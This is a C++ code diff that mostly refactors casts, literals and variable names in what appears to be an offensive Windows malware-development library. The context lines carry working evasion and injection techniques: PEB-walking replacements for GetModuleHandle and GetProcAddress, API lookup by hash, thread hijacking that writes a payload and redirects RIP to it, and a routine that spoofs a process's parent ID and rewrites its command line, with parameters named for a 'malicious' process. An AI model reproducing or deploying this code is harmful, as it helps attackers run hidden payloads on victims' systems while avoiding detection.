@@ -160,7 +160,7 @@ BOOLEAN CreateDebuggedProcess
 	return TRUE;
 }
 
-BOOLEAN CreateSuspendedProcess
+static BOOLEAN CreateSuspendedProcess
 (
 	IN     PCHAR   pProcessName,
 	   OUT PDWORD  pdwProcessId,
@@ -198,23 +198,22 @@ BOOLEAN FetchDrives
 	IN OUT LPWSTR pPath
 )
 {
-	DWORD dwDrivesBitMask		= 0x0;
-	USHORT drives_index			= 0x0,
-		   loop_index			= 0x0;
+	DWORD dwDrivesBitMask		= 0x00000000;
+	USHORT drives_index			= 0x00,
+		   loop_index			= 0x00;
 
-	if ((dwDrivesBitMask		= GetLogicalDrives()) == 0) return FALSE;
+	if ((dwDrivesBitMask		= GetLogicalDrives()) == 0x00000000) return FALSE;
 
-	for (loop_index = 0; loop_index <= 0x1c; loop_index++)
+	for (loop_index = 0x00; loop_index <= 0x1c; loop_index++)
 	{
-		if (dwDrivesBitMask & (1 << loop_index)) 
+		if (dwDrivesBitMask     & (1 << loop_index)) 
 		{
 			pPath[drives_index] = static_cast<WCHAR>(L'A' + loop_index);
 
 			drives_index++;
 		}
 	}
-
-	pPath[drives_index]			= 0x00;
+	pPath[drives_index]			= 0x0000;
 
 	return TRUE;
 }
@@ -224,11 +223,13 @@ LPWIN32_FIND_DATA_ARRAYW FetchFileArrayW
 	IN    LPWSTR pPath
 )
 {
-	WIN32_FIND_DATAW		 find_data_t	 = { 0x0 };
+	WIN32_FIND_DATAW		 find_data_t	 = {  };
 	LPWIN32_FIND_DATA_ARRAYW pFiles_arr_t	 = nullptr;
 	USHORT					 usFileLoopIndex = 0x0000;
-	SIZE_T					 sArraySize		 = 0x00000003;
+	SIZE_T					 sArraySize		 = 0x00000003,
+							 sFileName		 = 0x00000000;
 	LPWSTR					 pFileName		 = nullptr;
+
 
 	if ((pFiles_arr_t			 = static_cast<LPWIN32_FIND_DATA_ARRAYW>(malloc(sizeof(WIN32_FIND_DATA_ARRAYW)))) == nullptr) return nullptr;
 
@@ -243,16 +244,13 @@ LPWIN32_FIND_DATA_ARRAYW FetchFileArrayW
 	while (FindNextFileW(pFiles_arr_t->hBaseFile, &find_data_t))
 	{
 		if (usFileLoopIndex >= sArraySize / 2 && !FileBufferRoundUP(&sArraySize, &pFiles_arr_t->pFilesArr)) return nullptr;
-
 		
-		{
-			if (usFileLoopIndex == 0xFFFF) usFileLoopIndex = (DWORD)usFileLoopIndex;
-		}
 
+		if (usFileLoopIndex == 0xFFFF) usFileLoopIndex = static_cast<DWORD>(usFileLoopIndex);
 
-		SIZE_T sFileName = wcslen(find_data_t.cFileName);
+		sFileName = wcslen(find_data_t.cFileName);
 
-		if ((pFileName = static_cast<LPWSTR>(malloc(sFileName))) == nullptr) return nullptr;
+		if ((pFileName = static_cast<LPWSTR>(LocalAlloc(LPTR, sFileName))) == nullptr) return nullptr;
 
 		wcscpy_s(pFileName, sFileName + 1, find_data_t.cFileName);
 
@@ -362,7 +360,7 @@ cleanup:
 	return bState;
 }
 
-PPEB FetchProcessEnvironmentBlock
+static PPEB FetchProcessEnvironmentBlock
 ( 
 	IN     VOID 
 )
@@ -383,13 +381,13 @@ BOOLEAN FetchProcessHandleEnumProcesses
 	   OUT HANDLE   *phTargetProcessHandle
 )
 {
-	if (!lpTagetProcessName || !pdwTargetProcessId || !phTargetProcessHandle) return FALSE;
+	if (lpTagetProcessName == nullptr || pdwTargetProcessId == nullptr || phTargetProcessHandle == nullptr) return FALSE;
 
 	BOOLEAN  bState						   = FALSE;
 	DWORD    dwReturnLen1				   = 0,
 			 dwReturnLen2				   = 0,
-			 dwProcesses_arr[2048]		   = { 0 };
-	WCHAR    wcEnumeratedProcess[MAX_PATH] = { 0 };
+			 dwProcesses_arr[2048]		   = { 0x00000000 };
+	WCHAR    wcEnumeratedProcess[MAX_PATH] = { 0x00000000 };
 	HMODULE	 EnumeratedModule			   = nullptr;
 	HANDLE	 hProcess					   = INVALID_HANDLE_VALUE;
 
@@ -580,11 +578,11 @@ BOOLEAN FetchResource
 
 HMODULE GetModuleHandleReplacement
 (
-	IN LPWSTR lpwTargetModuleName
+	IN     LPWSTR lpwTargetModuleName
 )
 {
 	PPEB				  pProcessEnvironmentBlock = FetchProcessEnvironmentBlock();
-	PLDR_DATA_TABLE_ENTRY pLDRDataTableEntry	   = (PLDR_DATA_TABLE_ENTRY)pProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList.Flink;
+	PLDR_DATA_TABLE_ENTRY pLDRDataTableEntry	   = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList.Flink);
 	PLIST_ENTRY			  pListHead				   = &pProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList,
 						  pCurrentListNode		   = pListHead->Flink;
 
@@ -592,13 +590,10 @@ HMODULE GetModuleHandleReplacement
 	{
 		if (pLDRDataTableEntry->FullDllName.Length != 0) 
 		{
-			if (_wcsicmp(pLDRDataTableEntry->FullDllName.Buffer, lpwTargetModuleName) == 0) 
-			{
+			if (_wcsicmp(pLDRDataTableEntry->FullDllName.Buffer, lpwTargetModuleName) == 0)  return static_cast<HMODULE>(pLDRDataTableEntry->Reserved2[0]);
+			
 
-				return (HMODULE)pLDRDataTableEntry->Reserved2[0];
-			}
-
-			pLDRDataTableEntry = (PLDR_DATA_TABLE_ENTRY)(pCurrentListNode->Flink);
+			pLDRDataTableEntry = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pCurrentListNode->Flink);
 
 			pCurrentListNode   = pCurrentListNode->Flink;
 		}
@@ -615,10 +610,10 @@ HMODULE GetModuleHandleReplacementH
 {
 	PPEB				  pProcessEnvironmentBlock_t = FetchProcessEnvironmentBlock();
 	PPEB_LDR_DATA		  pLoaderDataTable_t		 = pProcessEnvironmentBlock_t->Ldr;
-	PLDR_DATA_TABLE_ENTRY pDataEntryDataTable_t		 = (PLDR_DATA_TABLE_ENTRY)pLoaderDataTable_t->InMemoryOrderModuleList.Flink;
+	PLDR_DATA_TABLE_ENTRY pDataEntryDataTable_t		 = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pLoaderDataTable_t->InMemoryOrderModuleList.Flink);
 	PLIST_ENTRY			  pListHead					 = &pProcessEnvironmentBlock_t->Ldr->InMemoryOrderModuleList,
 						  pCurrentListNode			 = pListHead->Flink;
-	DWORD				  dwCandidate				 = 0;
+	DWORD				  dwCandidate				 = 0x00000000;
 	do
 	{
 		if (pDataEntryDataTable_t->FullDllName.Length != 0)
@@ -627,9 +622,9 @@ HMODULE GetModuleHandleReplacementH
 
 			if (dwCandidate == dwTargetModuleName)
 			{
-				return (HMODULE)pDataEntryDataTable_t->Reserved2[0];
+				return static_cast<HMODULE>(pDataEntryDataTable_t->Reserved2[0]);
 			}
-			pDataEntryDataTable_t = (PLDR_DATA_TABLE_ENTRY)(pCurrentListNode->Flink);
+			pDataEntryDataTable_t = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pCurrentListNode->Flink);
 
 			pCurrentListNode = pCurrentListNode->Flink;
 		}
@@ -644,7 +639,7 @@ FARPROC GetProcessAddressReplacement
 	IN     LPSTR   lpTargetApiName
 )
 {
-	PBYTE					pModuleBaseAddress			= (PBYTE)Target_hModule;
+	PBYTE					pModuleBaseAddress			= reinterpret_cast<PBYTE>(Target_hModule);
 	PIMAGE_EXPORT_DIRECTORY pModuleExportDirectory		= nullptr;
 	PDWORD					pdwFunctionsNamesRVA_arr	= nullptr,
 							pdwFunctionsRVA_arr			= nullptr;
@@ -653,19 +648,19 @@ FARPROC GetProcessAddressReplacement
 
 	if (FetchImageExportDirectory(pModuleBaseAddress, &pModuleExportDirectory) == FALSE) return  nullptr;
 
-	pdwFunctionsNamesRVA_arr   = (PDWORD)(pModuleBaseAddress + pModuleExportDirectory->AddressOfNames);
+	pdwFunctionsNamesRVA_arr   = reinterpret_cast<PDWORD>(pModuleBaseAddress + pModuleExportDirectory->AddressOfNames);
 
-	pdwFunctionsRVA_arr		   = (PDWORD)(pModuleBaseAddress + pModuleExportDirectory->AddressOfFunctions);
+	pdwFunctionsRVA_arr		   = reinterpret_cast<PDWORD>(pModuleBaseAddress + pModuleExportDirectory->AddressOfFunctions);
 
-	pwFunctionsRVAOrdinals_arr = (PWORD)(pModuleBaseAddress  + pModuleExportDirectory->AddressOfNameOrdinals);
+	pwFunctionsRVAOrdinals_arr = reinterpret_cast<PWORD>(pModuleBaseAddress  + pModuleExportDirectory->AddressOfNameOrdinals);
 
 	for (DWORD i = 0; i < pModuleExportDirectory->NumberOfNames; i++)
 	{
-		if (strcmp(lpTargetApiName, (char *)pModuleBaseAddress + pdwFunctionsNamesRVA_arr[i]) != 0) continue;
+		if (strcmp(lpTargetApiName, reinterpret_cast<PCHAR>(pModuleBaseAddress + pdwFunctionsNamesRVA_arr[i])) != 0) continue;
 
-		WORD w_function_ordinal = pwFunctionsRVAOrdinals_arr[i];
+		WORD wFunctionsOrdinal = pwFunctionsRVAOrdinals_arr[i];
 
-		fnTargetFunction = (FARPROC)(pModuleBaseAddress + pdwFunctionsRVA_arr[w_function_ordinal]);
+		fnTargetFunction = reinterpret_cast<FARPROC>(pModuleBaseAddress + pdwFunctionsRVA_arr[wFunctionsOrdinal]);
 
 		break;
 	}
@@ -681,27 +676,23 @@ FARPROC GetProcessAddressReplacementH
 {
 	if (!Target_hModule || !dwTargetApiHash) return nullptr;
 
-	PBYTE					pImageBase				= (PBYTE)Target_hModule;
+	PBYTE					pImageBase				= reinterpret_cast<PBYTE>(Target_hModule);
 	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory_t	= nullptr;
 
-	if (FetchImageExportDirectory(pImageBase, &pImageExportDirectory_t) == FALSE) 
-	{
-		return nullptr;
-	}
-	PDWORD				pdwFunctionsNamesRVA_arr	= (PDWORD)(pImageBase + pImageExportDirectory_t->AddressOfNames),
-						pdwFunctionsRVA_arr			= (PDWORD)(pImageBase + pImageExportDirectory_t->AddressOfFunctions);
-	PWORD				pwFunctionsOrdinalsRVA_arr  = (PWORD )(pImageBase + pImageExportDirectory_t->AddressOfNameOrdinals);
-	DWORD				dwCandidateHash				= 0;
+	if (FetchImageExportDirectory(pImageBase, &pImageExportDirectory_t) == FALSE) return nullptr;
+	
+	PDWORD				pdwFunctionsNamesRVA_arr	= reinterpret_cast<PDWORD>(pImageBase + pImageExportDirectory_t->AddressOfNames),
+						pdwFunctionsRVA_arr			= reinterpret_cast<PDWORD>(pImageBase + pImageExportDirectory_t->AddressOfFunctions);
+	PWORD				pwFunctionsOrdinalsRVA_arr  = reinterpret_cast<PWORD >(pImageBase + pImageExportDirectory_t->AddressOfNameOrdinals);
+	DWORD				dwCandidateHash				= 0x00000000;
 	LPSTR				lpFunctionName				= nullptr;
 
 	for (DWORD i = 0; i < pImageExportDirectory_t->NumberOfFunctions; i++)
 	{
-		lpFunctionName = (LPSTR)(pImageBase + pdwFunctionsNamesRVA_arr[i]);
+		lpFunctionName = reinterpret_cast<LPSTR>(pImageBase + pdwFunctionsNamesRVA_arr[i]);
 
-		if (HASHA(lpFunctionName, 5) == dwTargetApiHash)
-		{
-			return (FARPROC)(pImageBase + pdwFunctionsRVA_arr[pwFunctionsOrdinalsRVA_arr[i]]);
-		}
+		if (HASHA(lpFunctionName, 5) == dwTargetApiHash) return reinterpret_cast<FARPROC>(pImageBase + pdwFunctionsRVA_arr[pwFunctionsOrdinalsRVA_arr[i]]);
+		
 	}
 	return nullptr;
 }
@@ -741,14 +732,14 @@ BOOLEAN HijackLocalThread
 {
 	if (!hThread || !pPayloadAddress || !sPayloadSize) return FALSE;
 
-	CONTEXT cThreadCOntext_t = {};
+	CONTEXT cThreadContext_t = {};
 
-	cThreadCOntext_t.ContextFlags = CONTEXT_CONTROL;
+	cThreadContext_t.ContextFlags = CONTEXT_CONTROL;
 
-	if (!GetThreadContext(hThread, &cThreadCOntext_t))
+	if (!GetThreadContext(hThread, &cThreadContext_t))
 	{
 		SuspendThread(hThread);
-		if (!GetThreadContext(hThread, &cThreadCOntext_t))return FALSE;
+		if (!GetThreadContext(hThread, &cThreadContext_t))return FALSE;
 	}
 
 	PVOID   pExecutionAddress;
@@ -758,9 +749,9 @@ BOOLEAN HijackLocalThread
 
 	memcpy(pExecutionAddress, pPayloadAddress, sPayloadSize);
 
-	cThreadCOntext_t.Rip = (ULONGLONG)pExecutionAddress;
+	cThreadContext_t.Rip = (ULONGLONG)pExecutionAddress;
 
-	if (!SetThreadContext(hThread, &cThreadCOntext_t)) return  FALSE;
+	if (!SetThreadContext(hThread, &cThreadContext_t)) return  FALSE;
 
 	if (!VirtualProtect(pExecutionAddress, sPayloadSize, PAGE_EXECUTE_READ , &dwOldProtections)) return FALSE;
 
@@ -771,7 +762,7 @@ BOOLEAN HijackLocalThread
 	return TRUE;
 }
 
-VOID TestAllertAbleThread
+VOID TestAlertableThread
 (
 	HANDLE hAlertableThreadHandle
 )
@@ -1021,9 +1012,9 @@ BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Proce
 	if (!pSpoofedCommandLine	  || !hSpoofedParentProcessHandle || !pMaliciousCommandLine  || !dwExposedCommandLineLength ||
 		!phMaliciousProcessHandle || !pdwMaliciousProcessId       || !phMalicousThreadHandle || !pdwMaliciousThreadId		  ) return FALSE;
 
-	WCHAR						 pSpoofedProcessPath[MAX_PATH]  = { 0x0 },
-								 pProcess[MAX_PATH]			    = { 0x0 },
-								 pSpoofedSubDirectory[MAX_PATH] = { 0x0 };
+	WCHAR						 pSpoofedProcessPath[MAX_PATH]  = { 0x0000 },
+								 pProcess[MAX_PATH]			    = { 0x0000 },
+								 pSpoofedSubDirectory[MAX_PATH] = { 0x0000 };
 
 	DWORD						 dwNewLen						= sizeof(L"powershell.exe");
 	HANDLE						 hHeap							= GetProcessHeap();
@@ -1043,11 +1034,11 @@ BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Proce
 
 	StartupInfoEx_t.StartupInfo.cb = sizeof(STARTUPINFOEXA);
 
-	if ((NtQueryProcInfo = (fnNTQueryProcessInformation)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess")) == nullptr) return FALSE;
+	if ((NtQueryProcInfo = reinterpret_cast<fnNTQueryProcessInformation>(GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess"))) == nullptr) return FALSE;
 
 	InitializeProcThreadAttributeList(nullptr, 1, 0, &sThreadAttributeListSize);
 	
-	if ((pThreadsAttributeList_t = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sThreadAttributeListSize)) == nullptr) return FALSE;
+	if ((pThreadsAttributeList_t = static_cast<PPROC_THREAD_ATTRIBUTE_LIST>(HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sThreadAttributeListSize))) == nullptr) return FALSE;
 
 	if (!InitializeProcThreadAttributeList(pThreadsAttributeList_t, 1, 0, &sThreadAttributeListSize)) goto EndOfFunc;
 
@@ -1079,15 +1070,15 @@ BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Proce
 
 	if ((ntStatus = NtQueryProcInfo(ProcessInformation_t.hProcess, ProcessBasicInformation, &ProcessBasicInfoBlock_t, sizeof(PROCESS_BASIC_INFORMATION), &ulRetren)) != 0) return FALSE;
 
-	pProcEnvBlock_t = (PPEB)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB));
+	pProcEnvBlock_t = static_cast<PPEB>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB)));
 
-	if (!ReadStructureFromProcess(ProcessInformation_t.hProcess, ProcessBasicInfoBlock_t.PebBaseAddress, (PVOID*)&pProcEnvBlock_t,sizeof(PEB), hHeap)) goto EndOfFunc;
+	if (!ReadStructureFromProcess(ProcessInformation_t.hProcess, ProcessBasicInfoBlock_t.PebBaseAddress, reinterpret_cast<PVOID*>(&pProcEnvBlock_t),sizeof(PEB), hHeap)) goto EndOfFunc;
 
-	if (!ReadStructureFromProcess(ProcessInformation_t.hProcess,pProcEnvBlock_t->ProcessParameters, (PVOID *)&pProcessUserParameters,sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF, hHeap)) goto EndOfFunc;
+	if (!ReadStructureFromProcess(ProcessInformation_t.hProcess,pProcEnvBlock_t->ProcessParameters, reinterpret_cast<PVOID *>(&pProcessUserParameters),sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF, hHeap)) goto EndOfFunc;
 
-	if (!WriteToTargetProcessEnvironmentBlock(ProcessInformation_t.hProcess, (PVOID)pProcessUserParameters->CommandLine.Buffer, (PVOID)pMaliciousCommandLine, (DWORD)(lstrlenW(pMaliciousCommandLine) * sizeof(WCHAR) + 1))) { goto EndOfFunc; }
+	if (!WriteToTargetProcessEnvironmentBlock(ProcessInformation_t.hProcess, pProcessUserParameters->CommandLine.Buffer, pMaliciousCommandLine, static_cast<DWORD>(lstrlenW(pMaliciousCommandLine) * sizeof(WCHAR) + 1)))  goto EndOfFunc; 
 
-	if (!WriteToTargetProcessEnvironmentBlock(ProcessInformation_t.hProcess, ((PBYTE)pProcEnvBlock_t->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&dwNewLen, sizeof(DWORD))) {goto EndOfFunc;}
+	if (!WriteToTargetProcessEnvironmentBlock(ProcessInformation_t.hProcess, (reinterpret_cast<PBYTE>(pProcEnvBlock_t->ProcessParameters ) + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), &dwNewLen, sizeof(DWORD))) goto EndOfFunc;
 
 	if (!ProcessInformation_t.dwProcessId || !ProcessInformation_t.dwThreadId|| !ProcessInformation_t.hProcess|| !ProcessInformation_t.hThread) goto EndOfFunc;
 
